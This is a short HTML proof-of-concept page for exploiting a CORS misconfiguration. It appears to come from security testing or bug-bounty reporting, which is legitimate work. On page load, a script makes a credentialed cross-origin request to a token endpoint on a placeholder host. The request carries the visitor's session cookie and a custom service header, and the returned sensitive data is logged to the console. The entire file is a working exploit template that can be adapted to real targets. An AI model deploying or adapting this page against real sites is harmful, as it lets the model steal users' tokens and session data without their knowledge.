<!DOCTYPE html>
<html>
<head>
    <title>CORS Misconfiguration PoC</title>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Send a GET request to the vulnerable endpoint with the required headers and cookie.
            fetch("https://your-local-demo-application.com/v1/token", {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "X-Bac-Service-Id": "AGENDA_BETA",
                },
                credentials: "include", // Send the `wassup` cookie along with the request.
            })
            .then(response => response.json())
            .then(data => {
                // The response contains sensitive information.
                console.log(data);
            })
            .catch(error => {
                console.error("Error fetching data:", error);
            });
        });
    </script>
</head>
<body>
    <!-- Your HTML content here -->
</body>
</html>
